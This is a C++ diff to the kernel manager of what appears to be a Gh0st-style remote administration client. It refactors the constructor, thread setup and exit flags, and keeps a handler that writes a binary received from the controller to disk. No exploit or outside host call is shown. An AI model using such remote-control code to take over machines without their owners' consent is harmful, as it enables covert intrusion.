@@ -13,7 +13,8 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CKernelManager::CKernelManager(IOCPClient* ClientObject):CManager(ClientObject)
+CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance) 
+	: m_conn(conn), m_hInstance(hInstance), CManager(ClientObject)
 {
 	m_ulThreadCount = 0;
 }
@@ -112,7 +113,8 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		}
 	}
 	else if (!isExit){
-		m_hThread[m_ulThreadCount].p = new IOCPClient(true);
+		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+		m_hThread[m_ulThreadCount].conn = m_conn;
 	}
 
 	switch(szBuffer[0])
@@ -127,6 +129,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_TALK:
 		{
+			m_hThread[m_ulThreadCount].user = m_hInstance;
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
 				LoopTalkManager,
 				&m_hThread[m_ulThreadCount], 0, NULL);;
@@ -161,7 +164,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			BYTE	bToken = COMMAND_BYE;// 被控端退出
 			m_ClientObject->OnServerSending((char*)&bToken, 1);
-			m_bIsDead = 1;
+			g_bExit = 1;
 			OutputDebugStringA("======> Client exit \n");
 			break;
 		}
@@ -170,7 +173,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			BYTE	bToken = SERVER_EXIT;// 主控端退出  
 			m_ClientObject->OnServerSending((char*)&bToken, 1);
-			m_bIsDead = 2;
+			g_bExit = 2;
 			OutputDebugStringA("======> Server exit \n");
 			break;
 		}
@@ -237,7 +240,6 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			ULONGLONG size=0;
 			memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
 			if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
-				extern BOOL g_bExit;
 				g_bExit = 3;
 			}
 			break;
